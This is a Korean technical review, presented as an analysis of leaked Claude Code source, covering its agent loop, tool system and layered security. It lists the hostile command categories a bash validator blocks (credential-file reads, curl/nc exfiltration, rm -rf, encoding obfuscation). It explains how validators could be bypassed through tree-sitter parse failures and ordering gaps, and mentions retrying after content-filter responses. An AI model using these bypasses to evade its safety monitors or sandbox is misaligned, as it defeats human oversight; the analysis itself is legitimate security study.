# Claude Code 심층 분석: Agent Loop, Tool 시스템, 보안 아키텍처

> Claude Code의 유출된 소스 코드(512,000줄)에 대한 기술 리뷰이다. 이 분석은 핵심 실행 엔진(`query.ts`), tool 추상화 계층(`Tool.ts`), 그리고 다층 보안 아키텍처에 초점을 맞추었다. 모든 평가는 관찰 가능한 코드 패턴과 아키텍처 결정에 근거한다.

---

## 1. Agent Loop: query.ts (1,730줄)

Claude Code의 심장부는 단일 파일 `query.ts`이다. 이 파일은 사용자, LLM, tool 시스템 간의 전체 상호작용 사이클을 조율한다. 1,730줄에 달하는 이 파일은 코드베이스에서 가장 핵심적이면서도 가장 복잡한 컴포넌트이다.

### 1.1 `while(true)` Async Generator 패턴

Agent loop는 호출자에게 이벤트를 발생 순서대로 yield하는 async generator 함수로 구현되어 있다. 기본 구조는 다음과 같다:

```typescript
async function* query(deps: QueryDeps, ...): AsyncGenerator<Event> {
  while (true) {
    // Phase 1: 컨텍스트 준비
    // Phase 2: API 스트리밍
    // Phase 3: 복구
    // Phase 4: Tool 실행
    // Phase 5: 계속 여부 결정
  }
}
```

이 패턴은 의도적인 아키텍처 선택이다. 콜백이나 이벤트 이미터 대신 async generator를 사용함으로써 Claude Code는 다음을 달성한다:

- **배압(backpressure) 제어**: 소비자가 자신의 속도에 맞춰 이벤트를 끌어간다. 고처리량 tool 실행 중 버퍼 오버플로를 방지할 수 있다.
- **지연 평가(lazy evaluation)**: LLM API 호출 같은 비용이 큰 연산은 소비자가 다음 값을 받을 준비가 되었을 때만 실행된다.
- **합성 가능성(composability)**: generator를 상위 coordinator가 핵심 루프를 수정하지 않고도 래핑, 필터링, 다중화할 수 있다.

다만 `while(true)` 프레이밍은 약간 오해의 소지가 있다. 루프는 무한히 실행되지 않으며, 다섯 개 phase에 흩어진 `return` 문으로 종료된다. 단일하고 깔끔한 종료 조건이 없다. 대신 종료 조건이 각 phase 경계에 맥락적으로 내장되어 있다. 이는 진화적 설계의 결과물이다. 각각의 새로운 기능이 통합된 종료 상태 머신에 기여하는 대신, 지역적으로 합리적인 지점에서 자체적인 "멈춰야 하나?" 검사를 추가했기 때문이다.

### 1.2 각 반복의 다섯 가지 Phase

각 루프 반복은 다섯 가지 고유한 phase를 거친다. 이 phase들을 이해하는 것은 시스템의 동작을 추론하는 데 필수적이다.

**Phase 1: 컨텍스트 준비**

API를 호출하기 전에 루프가 완전한 요청 컨텍스트를 조립한다. 여기에는 다음이 포함된다:

- 메시지 히스토리 재구성 (이전 반복에서 컨텍스트 압축을 통해 변경되었을 수 있음)
- 시스템 프롬프트 섹션 주입 (정적 및 동적 모두)
- tool 스키마 계산 (세션 안정적이며, 한 번 계산되어 고정됨)
- 토큰 예산 제약 적용 및 컨텍스트 압축 필요 여부 결정
- 프롬프트 캐싱 최적화를 위한 시스템 프롬프트 블록의 캐시 중단점 설정

이 phase에서 5계층 컨텍스트 압축 시스템(동반 보고서에서 상세히 다룸)이 agent loop와 접점을 형성한다. 루프가 압축 파이프라인에 위임하고, 가능하면 축소된 메시지 히스토리를 받아온다.

**Phase 2: API 스트리밍**

준비된 컨텍스트가 Anthropic API에 스트리밍 요청으로 전송된다. 응답은 Server-Sent Events(SSE)로 도착하며, 루프가 이를 점진적으로 처리한다. 여기서 `StreamingToolExecutor`(1.4절에서 논의)가 작업을 시작한다. tool 입력이 스트리밍되면서 파싱 및 검증되고, 모델이 응답을 완료하기 전에 실행을 시작할 수 있다.

스트리밍 phase는 여러 엣지 케이스를 처리한다:

- **tool 입력의 부분적 JSON**: tool 인자가 토큰 조각으로 도착한다. 실행기가 이를 버퍼링하고 점진적 JSON 파싱을 시도한다.
- **중단 사유 감지**: 모델이 여러 이유(`end_turn`, `max_tokens`, `tool_use`)로 중단될 수 있으며, 각각 다른 하류 동작을 트리거한다.
- **속도 제한 및 일시적 오류**: HTTP 429와 5xx 응답은 지터(jitter)를 포함한 지수 백오프를 트리거하며, 이 phase 내에서 투명하게 처리된다.

**Phase 3: 복구**

API 응답이 완료되거나 실패한 후, 복구 phase에서 응답이 사용 가능한지를 결정한다. 이 phase는 "보류하고 복구하기(withhold and recover)" 철학(4.1절)을 구현한다. 부분적이거나 잘못된 형식의 응답을 사용자에게 표시하는 대신, 시스템이 자체 복구를 시도한다.

복구 시나리오는 다음과 같다:

- **잘못된 형식의 tool use 블록**: 모델이 tool 인자에 대해 구문적으로 유효하지 않은 JSON을 생성한 경우, 시스템이 교정 프롬프트와 함께 재시도할 수 있다.
- **잘린 응답**: `max_tokens`에 문장 중간에 도달한 경우, 시스템이 토큰 예산을 올리고 재시도한다.
- **콘텐츠 필터링**: API가 콘텐츠 필터 응답을 반환한 경우, 시스템이 재구성하여 재시도한다.

**Phase 4: Tool 실행**

유효한 tool use 블록이 각각의 tool 구현체로 전달된다. tool들은 완전한 격리 상태에서 실행되며(각 tool 호출이 자체 에러 경계를 가짐), 결과가 다음 반복을 위해 메시지 히스토리에 수집된다.

이 phase의 핵심 세부사항:

- `isConcurrencySafe=true`인 tool은 단일 반복 내에서 병렬 실행이 가능하다.
- tool 결과는 3계층 예산 시스템(2.3절)의 적용을 받는다.
- 권한 검사가 여기서 발생한다. tool이 사용자 승인을 요구하면 루프가 권한 요청 이벤트를 yield하고 사용자가 응답할 때까지 일시 중단된다.

**Phase 5: 계속 여부 결정**

가장 미묘한 phase이다. 루프는 또 다른 API 호출을 할 것인지 종료할 것인지를 결정해야 한다. 이 결정은 다음에 영향을 받는다:

- 모델이 `tool_use` 중단 사유를 생성했는지 여부 (계속: tool 결과를 보내야 함)
- 모델이 `end_turn` 중단 사유를 생성했는지 여부 (보통은 종료하지만 항상 그렇지는 않음)
- 7개의 continue point(1.3절) 중 어느 것이 트리거되었는지
- 토큰 예산이 소진되었는지 여부
- 사용자가 상호작용을 인터럽트했는지 여부

계속 여부 결정은 단순한 boolean이 아니다. 여러 신호에 대한 우선순위 기반 평가이며, 일부 신호가 다른 신호를 오버라이드할 수 있다. 예를 들어, 모델이 예산 제약으로 인해 조기에 중단된 것으로 보이는 경우 `token_budget_continuation`이 `end_turn` 중단 사유를 오버라이드할 수 있다.

### 1.3 7개의 Continue Point

Agent loop에는 모델이 명목상 "완료"했을 때에도 반복을 계속하게 만들 수 있는 7개의 고유한 메커니즘이 있다. 각 continue point는 자체적인 트리거 조건, 상태 재구성 로직, 복구 전략을 가진다.

**1. `collapse_drain_retry`**

컨텍스트 collapse(압축 파이프라인의 3계층)가 요청 중에 활성화될 때 트리거된다. 컨텍스트가 collapse되면 현재 API 응답이 버려지고 압축된 컨텍스트로 루프가 재시작된다. 이것은 "drain and retry"이다. 응답이 drain(소비 및 폐기)되고 요청이 처음부터 재시도된다.

이 continue point가 존재하는 이유는 컨텍스트 collapse가 유효 메시지 히스토리를 너무 극적으로 변경하여, 모델의 진행 중인 응답이 새로운 컨텍스트와 일관성이 없을 수 있기 때문이다. 일관성 없는 응답의 위험을 감수하는 대신, 전체 재시도의 지연 비용을 지불하는 것이다.

**2. `reactive_compact_retry`**

`collapse_drain_retry`와 유사하지만, 사전적(proactive)이 아닌 반응적(reactive) 컨텍스트 압축에 의해 트리거된다. API가 "컨텍스트가 너무 긺" 오류를 반환하면, 시스템이 컨텍스트를 압축하고 재시도한다. `collapse_drain_retry`와의 차이는 트리거(API 오류 vs. 사전 감지)와 압축 전략(더 공격적인 잘라내기)에 있다.

**3. `max_output_tokens_escalate`**

모델이 `max_tokens` 제한에 도달했을 때 트리거된다. 이를 종료 조건으로 처리하는 대신, 시스템이 토큰 예산을 올리고(일반적으로 두 배로, 하드 상한까지) 재시도한다. 이는 모델의 응답이 처음 예상보다 긴 일반적인 경우를 처리한다.

상승은 제한적이다. 구성 가능한 횟수의 상승 후, 시스템은 `max_output_tokens_recovery`로 폴백한다.

**4. `max_output_tokens_recovery`**

토큰 예산 상승이 소진되었을 때 트리거된다. 시스템은 잘린 응답을 수락하고 모델에게 중단된 지점부터 계속하라는 프롬프트를 보내어 복구를 시도한다. 이는 우아한 성능 저하 경로이다. 사용자는 완전한 응답을 받지만, 여러 API 호출에서 조립된 것일 수 있다.

**5. `streaming_fallback`**

스트리밍 연결이 응답 중간에 끊어질 때(네트워크 오류, 서버 타임아웃 등) 트리거된다. 시스템은 동일한 컨텍스트로 비스트리밍 요청으로 폴백한다. 비스트리밍 요청도 실패하면 오류가 사용자에게 표시된다.

이 continue point에는 "tombstone message" 정리가 포함된다. 실패한 스트리밍 응답의 부분적 콘텐츠가 tombstone 마커로 대체되어, 재시도 시 모델이 자신의 부분적 출력을 보고 일관성 없는 사고의 흐름을 계속하는 것을 방지한다.

**6. `stop_hook_blocking`**

등록된 stop hook(IDE 통합 및 플러그인을 위한 확장 포인트)가 종료를 거부할 때 트리거된다. 모델이 `end_turn`을 말했지만 hook가 상호작용을 계속해야 한다고 결정했다. 예를 들어, VS Code 확장이 사용자가 추가 명령을 대기열에 넣었을 때 루프를 계속 실행하는 데 사용된다.

**7. `token_budget_continuation`**

모델이 `end_turn`으로 멈추었지만 시스템이 응답이 불완전할 가능성이 있다고 감지할 때 트리거된다. 휴리스틱에는 다음이 포함된다: 응답이 문장 중간에 끝남, 요청의 복잡성에 비해 응답이 의심스럽게 짧음, 모델이 후속 메시지에서 계속하겠다고 명시적으로 언급함.

이것은 가장 휴리스틱에 의존하는 continue point이므로 가장 취약하다. 오탐(모델이 진정으로 완료했을 때 계속함)은 API 호출을 낭비하고 상호작용 흐름을 혼란시킬 수 있다. 미탐(모델이 계속해야 할 때 멈춤)은 응답을 잘라버린다.

### 1.4 StreamingToolExecutor: 투기적 실행을 통한 지연 시간 최적화

Agent loop에서 기술적으로 가장 인상적인 컴포넌트 중 하나가 `StreamingToolExecutor`이다. 이 하위 시스템은 완전한 응답을 기다리는 대신, *모델이 아직 응답을 스트리밍하고 있는 동안* tool 실행을 시작한다.

이 최적화는 상당하다. 모델이 세 개의 tool 호출을 순차적으로 생성하는 시나리오를 생각해 보자. 스트리밍 실행 없이:

```
[모델 스트리밍 10초] → [tool 파싱 0.1초] → [tool 1 실행: 2초] → [tool 2 실행: 3초] → [tool 3 실행: 1초]
합계: 16.1초
```

스트리밍 실행 시:

```
[모델이 tool 1 인자 스트리밍 (3초)] → [tool 1 실행 시작]
[모델이 tool 2 인자 스트리밍 (4초)] → [tool 2 실행 시작]  (tool 1이 여기서 완료될 수 있음)
[모델이 tool 3 인자 스트리밍 (3초)] → [tool 3 실행 시작]  (tool 1 완료, tool 2 완료될 수 있음)
합계: ~13초 (tool이 스트리밍 및 서로 겹침)
```

절약은 tool 실행 시간과 동시 실행 안전한 tool의 수에 비례한다.

구현 세부사항:

- **점진적 JSON 파싱**: tool 입력 JSON이 토큰이 도착함에 따라 점진적으로 파싱된다. JSON이 구문적으로 완전하면(모든 중괄호/대괄호가 매칭됨) 즉시 실행이 시작된다.
- **동시성 게이팅**: `isConcurrencySafe=true`로 표시된 tool만 동시 실행이 가능하다. 읽기 전용 tool(파일 읽기, 검색)은 동시 실행 안전하다. 쓰기 tool(파일 편집, bash 명령)은 순차적으로 실행된다.
- **취소 전파**: 스트리밍 응답이 중단되면(continue point 트리거 또는 사용자 인터럽트로 인해), 진행 중인 tool 실행이 AbortController 신호를 통해 취소된다.
- **결과 순서 보장**: tool 결과는 실행 완료 순서와 관계없이 모델이 요청한 순서대로 yield된다. 이는 대화 히스토리의 예상되는 메시지 순서를 유지한다.

### 1.5 상태 재구성 vs. 단편적 변이

`query.ts`의 핵심적인 아키텍처 긴장은 continue point 간에 상태가 어떻게 관리되는가이다. 코드베이스는 두 가지 경쟁하는 패턴을 보인다:

**상태 재구성**: 특정 continue point(특히 `collapse_drain_retry`와 `reactive_compact_retry`)에서 루프가 상태를 처음부터 재구성한다. 메시지 히스토리가 재계산되고, 토큰 예산이 재산정되며, API 요청이 새로 조립된다. 이것이 더 안전한 패턴이다. 중복 계산의 비용을 치르되 오래된 상태 버그를 제거한다.

**단편적 변이**: 다른 continue point(특히 `max_output_tokens_recovery`와 `token_budget_continuation`)에서 루프가 기존 상태를 점진적으로 변이한다. 부분적 응답이 히스토리에 추가되고, 토큰 예산이 조정되며, 다음 API 요청이 변이된 상태 위에 구축된다. 이것이 더 효율적이지만 상태 불일치의 위험을 도입한다.

이 두 패턴 간의 불일치는 유지보수 위험이다. 루프를 수정하는 개발자는 어떤 continue point가 재구성하고 어떤 것이 변이하는지를 이해해야 한다. 불변량이 다르기 때문이다. 변이 기반 continue point는 이전 반복 후 루프의 로컬 변수가 일관된 상태에 있다고 가정한다. 재구성 기반 continue point는 그런 가정을 하지 않는다.

### 1.6 종료 조건

루프는 다음 경우에 종료된다:

1. 모델이 `end_turn`을 생성하고 어떤 continue point도 이를 오버라이드하지 않을 때
2. 토큰 예산이 복구 불가능하게 소진되었을 때
3. 사용자가 인터럽트 신호(Ctrl+C)를 보낼 때
4. 복구 불가능한 치명적 오류가 발생할 때 (예: 인증 실패, 계정 정지)
5. 최대 반복 횟수에 도달할 때 (구성 가능하며, 높지만 유한한 수가 기본값)

조건 5는 무한 루프에 대한 안전망이다. `while(true)` 구조와 7개의 continue point를 감안하면 이것이 필요하다. 이것이 없으면 병리적 상호작용이 무한히 반복될 수 있다. 예를 들어, tool이 항상 continue point를 트리거하는 방식으로 실패하지만, 모델이 그 tool 호출을 멈추는 것을 학습하지 못하는 경우가 있다.

### 1.7 Agent Loop에 대한 비평적 평가

**잘 만든 점:**

- Async generator 패턴은 이 유스케이스에 탁월한 선택이다. 자연스러운 배압, 합성 가능성, 지연 평가를 제공한다.
- StreamingToolExecutor는 진정으로 혁신적이다. 스트리밍 중 투기적 tool 실행을 통한 지연 시간 절약은 상당하고 비자명하다.
- "보류하고 복구하기" 철학은 건전하다. 시스템이 자체 복구할 수 있을 때 사용자는 부분적이거나 잘못된 형식의 응답을 결코 보아서는 안 된다.

**아쉬운 점:**

- **복잡성 한계**: 1,730줄의 `query.ts`는 인간 이해력의 한계에 접근하고 있다. 7개의 continue point는 최소 7 x 5 = 35개의 가능한 상태 전이(7개의 continue point x 5개의 phase)를 가진 암묵적 상태 머신을 생성한다. 이 조합적 공간은 명시적으로 문서화되거나 테스트되지 않았다.
- **암묵적 상태 머신**: continue point는 형식적 상태 머신으로 모델링되어 있지 않다. 상태 전이 다이어그램도 없고, 유효한 전이의 완전한 열거도 없으며, 모든 전이가 처리되었다는 컴파일 타임 보장도 없다. 이는 유지보수 시한폭탄이다. 새로운 continue point마다 기존의 모든 continue point와의 상호작용 표면이 배가된다.
- **혼합된 변이 전략**: continue point 간의 재구성과 단편적 변이의 불일치(1.5절)는 미묘한 버그의 원천이다. 통합된 접근 방식(항상 재구성하거나, 명시적 불변량 검사를 포함한 변이를 항상 사용)이 더 유지보수 가능할 것이다.
- **테스트 표면**: agent loop의 조합적 상태 공간은 전통적인 단위 테스트로는 사실상 테스트 불가능하다. 통합 테스트가 일반적인 경로를 커버할 수 있지만, continue point 상호작용의 긴 꼬리 부분은 아마도 테스트가 부족할 것이다.

## 2. Tool 시스템: Tool.ts (793줄)

### 2.1 Tool 인터페이스

Claude Code의 tool 시스템은 약 30개의 메서드와 속성을 정의하는 단일 `Tool` 인터페이스 위에 구축되어 있다. 이 인터페이스는 agent loop와 개별 tool 구현체(Read, Write, Edit, Bash, Glob, Grep 등) 간의 계약이다.

주요 인터페이스 멤버는 다음과 같다:

```typescript
interface Tool {
  // 식별
  name: string;
  aliases?: string[];
  description: string;

  // 스키마
  inputSchema: ZodSchema;  // Zod 기반 런타임 검증

  // 실행
  execute(input: unknown, context: ToolContext): Promise<ToolResult>;

  // 역량 선언
  isConcurrencySafe: boolean;
  isReadOnly: boolean;
  interruptBehavior: InterruptBehavior;

  // 결과 예산
  maxResultSizeChars?: number;

  // 권한
  requiresPermission(input: unknown): boolean;
  permissionDescription(input: unknown): string;

  // ... 분석, 검증 등을 위한 추가 메서드
}
```

입력 검증에 Zod를 사용하는 것은 실용적인 선택이다. LLM이 tool 호출에 대한 JSON 인자를 생성하며, 이것은 실행 전에 검증되어야 한다. Zod는 런타임 검증과 TypeScript 타입 추론을 모두 제공하므로, tool 구현체가 수동 타입 어서션 없이 올바르게 타입된 입력을 받을 수 있다.

다만 인터페이스 표면적(약 30개 메서드)이 크다. 많은 tool이 이 메서드의 부분 집합만 필요로 한다. `buildTool()` 팩토리(2.2절)가 합리적인 기본값을 제공하여 이를 해결하지만, 기저의 인터페이스 복잡성은 남아 있다.

### 2.2 buildTool()과 실패 시 닫힘(Fail-Closed) 기본값

Tool은 보안 관련 모든 속성에 대해 실패 시 닫힘 기본값을 제공하는 `buildTool()` 팩토리 함수를 통해 구성된다:

```typescript
function buildTool(config: Partial<Tool>): Tool {
  return {
    isConcurrencySafe: false,   // 동시 실행에 안전하지 않다고 가정
    isReadOnly: false,          // 쓰기를 한다고 가정 (권한 필요)
    interruptBehavior: 'cancel', // 사용자 인터럽트 시 취소
    maxResultSizeChars: 50_000, // 50KB 기본 결과 제한
    ...config,
  };
}
```

실패 시 닫힘 기본값은 교과서적인 보안 실천이다. `isConcurrencySafe` 선언을 잊은 tool 작성자는 안전한 기본값(순차 실행)을 받는다. `isReadOnly`를 잊은 tool 작성자는 안전한 기본값(권한 필요)을 받는다. 이는 적절한 역량 선언 없이 새 tool이 추가되는 보안 버그의 전체 범주를 제거한다.

이 패턴은 tool 작성자가 성능 이유로 기본값을 오버라이드하도록 동기를 부여하기 때문에 특히 효과적이다. tool이 읽기 전용이라면 권한 프롬프트 없이 실행되도록 선언하고 *싶을* 것이다. 이것은 긍정적 피드백 루프를 만든다: 보안 관련 선언이 사용자 경험에 영향을 주기 때문에 적극적으로 유지 관리된다.

### 2.3 3계층 Tool 결과 예산

Tool 결과는 임의로 커질 수 있다(10MB 로그 파일의 `Read`나 대량 출력을 생성하는 `Bash` 명령을 상상해 보라). 무제한 tool 결과를 LLM에 보내면 토큰을 낭비하고 컨텍스트 제한을 초과할 수 있다. Claude Code는 이를 3계층 예산 시스템으로 해결한다:

**1계층: Tool별 제한 (기본 50KB)**

각 tool에는 `maxResultSizeChars` 속성(기본 50,000자)이 있다. 이 제한을 초과하는 결과는 얼마나 생략되었는지를 나타내는 설명 메시지와 함께 잘린다. 이는 단일 tool 호출이 컨텍스트를 지배하는 것을 방지한다.

**2계층: 메시지별 합산 제한 (200KB)**

단일 어시스턴트 메시지(여러 tool 호출을 포함할 수 있음) 내에서 총 tool 결과 크기가 약 200KB로 제한된다. 이는 모델이 개별적으로는 1계층을 통과하지만 전체적으로는 컨텍스트를 압도하는 많은 작은 tool 호출을 하는 시나리오를 방지한다.

합산 제한은 `ContentReplacementState`를 통해 시행되며, 이 구조체는 누적 결과 크기를 추적하고 "동결된 교체(frozen replacements)"를 적용한다. 결과가 예산에 맞게 잘리면, 이후 컨텍스트 압축이 공간을 확보하더라도 잘린 상태는 영구적으로 되돌려지지 않는다. 이는 결과가 반복 간에 교대로 잘리고 복원되는 진동을 방지한다.

**3계층: 절대 토큰 제한 (100K 토큰)**

최종 안전망으로, tool 결과는 토큰 단위(대략적인 4바이트당 1토큰 추정기 사용)로 측정되어 100,000 토큰으로 제한된다. 이는 문자 수 기반 제한이 인코딩 차이로 인해 부족한 엣지 케이스를 잡는다(예: 비ASCII 콘텐츠에서 문자 수가 토큰 수를 상당히 과소평가하는 경우).

**`maxResultSizeChars=Infinity` 탈출구**

`Read` tool은 `maxResultSizeChars=Infinity`로 특별 처리된다. 이는 순환 실패 모드를 방지하기 위해 필요하다: Read tool의 결과가 잘리면, 모델이 잘린 부분을 보기 위해 같은 파일을 다시 읽으려 할 수 있는데, 또다시 잘린 결과를 받게 되어 Read 호출의 무한 루프가 생성된다. 무제한 Read 결과를 허용함으로써, 모델이 첫 번째 읽기에서 완전한 파일 내용을 볼 수 있도록 보장한다.

이 탈출구는 신중하게 범위가 제한되어 있다. Read tool만 이를 사용하며, 메시지별 합산 제한(2계층)과 절대 토큰 제한(3계층)은 여전히 적용된다. 10MB 파일 읽기는 2계층 또는 3계층에 의해 잘리겠지만, 일반적인 소스 파일(50KB 미만)은 수정 없이 통과한다.

### 2.4 InterruptBehavior 패턴

사용자가 tool 실행 중에 인터럽트 신호(Ctrl+C)를 보내면, 시스템은 진행 중인 tool을 어떻게 처리할지 결정해야 한다. `InterruptBehavior` 열거형은 두 가지 옵션을 제공한다:

- **`cancel`**: tool 실행이 AbortController를 통해 즉시 중단된다. tool 결과는 폐기된다. 이것이 기본값이며 대부분의 tool에 적절하다.
- **`block`**: 인터럽트에도 불구하고 tool 실행이 완료될 때까지 계속된다. 인터럽트는 tool이 완료될 때까지 지연된다. 이는 부분 실행이 시스템을 불일치 상태로 남길 수 있는 tool(예: 중간에 있는 파일 쓰기)에 사용된다.

`block` 동작은 현실에 대한 실용적 양보이다. 이상적인 시스템에서는 모든 연산이 원자적이고 안전하게 취소 가능할 것이다. 실제로 일부 연산(특히 파일시스템 쓰기나 서브프로세스 관리를 포함하는 연산)은 취소가 해로울 비원자성의 구간이 있다.

### 2.5 Tool Alias와 디스커버리

Tool은 별칭(alias)을 등록할 수 있다. 이는 LLM이 tool을 호출하는 데 사용할 수 있는 대체 이름이다. 예를 들어 `Bash` tool이 `Terminal`이나 `Shell`로 별칭 등록될 수 있다. 이는 실용적인 문제를 해결한다: 서로 다른 LLM 모델이 서로 다른 tool 명명 규칙으로 학습되었을 수 있으며, 별칭은 모델별 tool 스키마가 필요 없이 호환성을 보장한다.

Tool 디스커버리는 시스템 프롬프트의 tool 스키마 블록을 통해 처리된다. 사용 가능한 모든 tool, 스키마, 설명이 직렬화되어 시스템 프롬프트에 포함된다. 이것은 세션당 한 번 계산되고 고정되며(세션 안정적), 프롬프트 캐싱에 중요하다. tool 스키마가 요청 간에 변경되면 캐시된 프롬프트가 무효화될 것이기 때문이다.

### 2.6 Tool 시스템에 대한 비평적 평가

**잘 만든 점:**

- 실패 시 닫힘 기본값은 보안 기본 설계(secure-by-default)의 교과서적 예이다.
- 3계층 예산 시스템은 철저하고 엣지 케이스를 잘 처리한다.
- Read에 대한 `maxResultSizeChars=Infinity` 탈출구는 실제 문제에 대한 영리한 해결책이다.
- InterruptBehavior는 인터럽트 처리의 암묵적 트레이드오프를 명시적으로 만든다.

**아쉬운 점:**

- Tool 인터페이스가 크다(약 30개 메서드). 이는 새 tool 구현에 대한 진입 장벽을 높이고 시간이 지남에 따라 인터페이스 비대화의 위험이 있다.
- 동결된 교체를 포함한 `ContentReplacementState`는 메시지 히스토리 관리에 복잡성을 더한다. 잘라내기가 영구적이라는 불변량은 비자명하며, 컨텍스트 압축이 tool 결과를 위한 "공간을 확보"할 것으로 기대하는 개발자를 놀라게 할 수 있다.
- 3계층의 4바이트당 1토큰 추정은 부정확한 것으로 인정된다. 코드 중심 콘텐츠(Claude Code의 주요 유스케이스)에서 이 비율은 상당히 빗나갈 수 있으며, 예산 초과 결과를 허용하거나 짧은 결과를 조기에 잘라내는 원인이 될 수 있다.

## 3. 보안 아키텍처: 심층 방어

Claude Code의 보안 아키텍처는 코드베이스에서 가장 인상적인 측면이라 할 수 있다. 각각 다른 공격 벡터를 대상으로 하는 6개 이상의 방어 계층을 구현한다. 계층적 접근 방식은 어떤 단일 계층의 우회로도 시스템을 침해하기에 불충분함을 의미한다.

### 3.1 계층 1: Bash 검증기 (bashSecurity.ts, 2,450줄)

첫 번째 방어선은 `bashSecurity.ts`의 23개 bash 명령 검증기이다. 이 검증기들은 bash 명령을 *실행 전에* 분석하고 승인, 거부, 또는 사용자 승인을 위해 플래그한다.

검증기는 공격 카테고리별로 구성되어 있다:

- **파일 시스템 공격**: 민감한 파일(`.env`, `~/.ssh/`, `/etc/passwd`)을 읽고 쓸 수 있는 명령
- **네트워크 공격**: 데이터를 유출할 수 있는 명령(`curl`, `wget`, `nc`, 외부 호스트로의 파이프)
- **권한 상승**: 시스템 설정을 변경할 수 있는 명령(`sudo`, `chmod`, `chown`)
- **파괴적 연산**: 데이터 손실을 초래할 수 있는 명령(`rm -rf`, `git reset --hard`, `mkfs`)
- **프로세스 공격**: 시스템 운영을 방해할 수 있는 명령(`kill`, `pkill`, 프로세스 인젝션)
- **인코딩 회피**: 인코딩 트릭으로 다른 검증기를 우회하는 명령(`base64`, `xxd`, `printf \x`)

#### 오파싱(Misparsing)과 비오파싱(Non-Misparsing) 구분

Bash 검증기에서 핵심적인 설계 결정은 "misparsing"과 "non-misparsing" 검증기의 구분이다:

- **Non-misparsing 검증기**는 원시 명령 문자열에 대해 작동한다. 정규식 패턴과 문자열 매칭을 사용한다. 빠르지만 명령 난독화(예: `curl` 대신 `c'u'r'l'`)로 회피할 수 있다.
- **Misparsing 검증기**는 tree-sitter(3.7절)가 생성한 명령의 파싱된 AST에 대해 작동한다. 더 느리지만 텍스트 표현이 아닌 명령의 의미적 구조를 보기 때문에 난독화에 대한 내성이 있다.

이 구분이 존재하는 이유는 tree-sitter 파싱이 항상 사용 가능하거나 성공하지는 않기 때문이다. 명령을 파싱할 수 없는 경우(예: tree-sitter의 문법이 커버하지 않는 bash 구문을 사용하는 경우), 시스템은 non-misparsing 검증기로 폴백한다. 이는 심층 방어 결정이다: 불완전한 검증이 검증 없음보다 낫다.

그러나 AST 기반에서 정규식 기반 검증으로의 폴백은 잠재적 취약점이다. tree-sitter 파싱이 실패하도록(하지만 bash에서는 정상 실행되도록) 명령을 만들 수 있는 공격자는 잠재적으로 misparsing 검증기를 우회하고 더 약한 non-misparsing 검증기만 직면하게 될 수 있다. 코드베이스는 이 위험을 인식하고 있으며 -- tree-sitter가 잘 처리하지 못하는 특정 bash 구성을 언급하는 주석이 있다 -- 하지만 완화가 불완전하다.

#### 지연된 결과(Deferred Result) 안티패턴

검증기는 특정 순서로 평가되며, 결과는 우선순위 시스템을 사용하여 결합된다. 그러나 특정 검증기는 최종 허용/거부 결정을 내리는 대신 하류 계층(예: ML 분류기)에 의한 추가 평가를 위해 명령을 플래그하는 "지연된" 결과를 반환한다.

이 지연된 결과 패턴은 순서 의존성을 생성한다: 명령을 거부할 검증기가 그것을 지연하는 검증기 *이후에* 평가되면, 지연된 결과가 평가 체인을 단축시키기 때문에 거부가 실행되지 않을 수 있다. 코드베이스에는 이 안티패턴을 인정하고 유지해야 하는 특정 순서 제약을 언급하는 주석이 포함되어 있다.

### 3.2 계층 2: 8개 소스 권한 시스템

Claude Code의 권한 시스템은 8개의 서로 다른 소스로부터 인가 결정을 집계한다:

1. **localSettings**: `.claude/settings.json`에 저장된 프로젝트별 설정
2. **projectSettings**: 리포지토리에 커밋된 프로젝트 수준 설정(`.claude/settings.json`)
3. **userSettings**: `~/.claude/settings.json`에 저장된 사용자 수준 설정
4. **enterpriseSettings**: MDM 또는 유사 방식으로 배포된 조직 전체 설정
5. **sessionPermissions**: 현재 세션 동안 부여된 권한 (임시)
6. **toolDefaults**: tool 자체가 정의한 기본 권한
7. **mcpPermissions**: MCP(Model Context Protocol) 서버 제공 tool의 권한
8. **runtimeFlags**: 명령줄 플래그(`--allowedTools` 등)의 권한

8개 소스 설계는 의도적이다: 서로 다른 이해관계자(사용자, 프로젝트 관리자, 기업 관리자)가 서로 다른 세분성으로 정책을 설정할 수 있게 한다. 기업 설정은 사용자 설정을 오버라이드할 수 있고, 사용자 설정은 프로젝트 설정을 오버라이드할 수 있다. 이는 CSS 명시도(specificity)가 작동하는 방식과 유사한 표준 정책 캐스케이드이다.

구현은 우선순위 순서 평가를 사용한다: 높은 우선순위 소스(기업)가 낮은 우선순위 소스(프로젝트 기본값)를 오버라이드한다. 충돌은 높은 우선순위 소스에 유리하게 해결된다. "가장 제한적인 것이 승리" 원칙은 거부 규칙에 적용된다. 어떤 소스든 권한을 거부하면, 다른 소스가 무엇을 말하든 해당 권한은 거부된다.

### 3.3 계층 3: ML 분류기 (yoloClassifier)

Bash 검증기를 통과했지만 여전히 잠재적으로 위험해 보이는 모호한 명령에 대해, Claude Code는 보조 AI 분류기를 사용한다. 이 분류기는 별도의 작은 모델 호출(주 Claude 모델이 아님)로, 명령을 컨텍스트에서 평가하고 안전 분류를 반환한다.

핵심 설계 결정:

- **별도 모델 호출**: 분류기는 메인 대화의 일부가 아닌 별도의 API 호출이다. 이는 주 모델이 대화 컨텍스트를 통해 안전 평가에 영향을 미치는 것을 방지한다.
- **어시스턴트 텍스트 제외**: 분류기는 명령을 생성한 어시스턴트(Claude)의 텍스트를 보지 않는다. 이는 핵심적인 프롬프트 인젝션 방어 조치이다. 주 모델이 (사용자 제공 콘텐츠의 프롬프트 인젝션을 통해) 손상된 경우, 위험한 명령에 대한 설득력 있는 정당화를 생성할 수 있다. 어시스턴트 텍스트를 제외함으로써 분류기가 명령 자체의 장점으로 평가한다.
- **서킷 브레이커**: 구성 가능한 횟수의 분류기 실패(API 오류, 타임아웃) 후, 시스템은 모든 모호한 명령에 대해 수동 사용자 승인을 요구하는 것으로 폴백한다. 이는 분류기 장애가 모든 명령을 차단하거나 모든 명령을 암묵적으로 승인하는 것을 방지한다.

"yoloClassifier"라는 이름은 그 기원을 암시한다 -- 시스템이 사용자 개입 없이 자동으로 명령을 승인하는 "YOLO 모드"를 위해 도입되었을 가능성이 높다. YOLO 모드에서 분류기는 사용자가 자동 승인을 선택했을 때에도 시스템이 진정으로 위험한 명령을 실행하는 것을 방지하는 안전망 역할을 한다.

### 3.4 계층 4: OS 수준 샌드박싱

Claude Code는 명령이 이전의 모든 검증 계층을 통과했는지 여부와 관계없이, 명령이 운영 체제 수준에서 할 수 있는 것을 제한하는 OS 수준 샌드박싱을 구현한다.

**macOS: seatbelt (sandbox-exec)**

macOS에서 명령은 다음을 제한하는 Seatbelt 샌드박스 프로파일 내에서 실행된다:

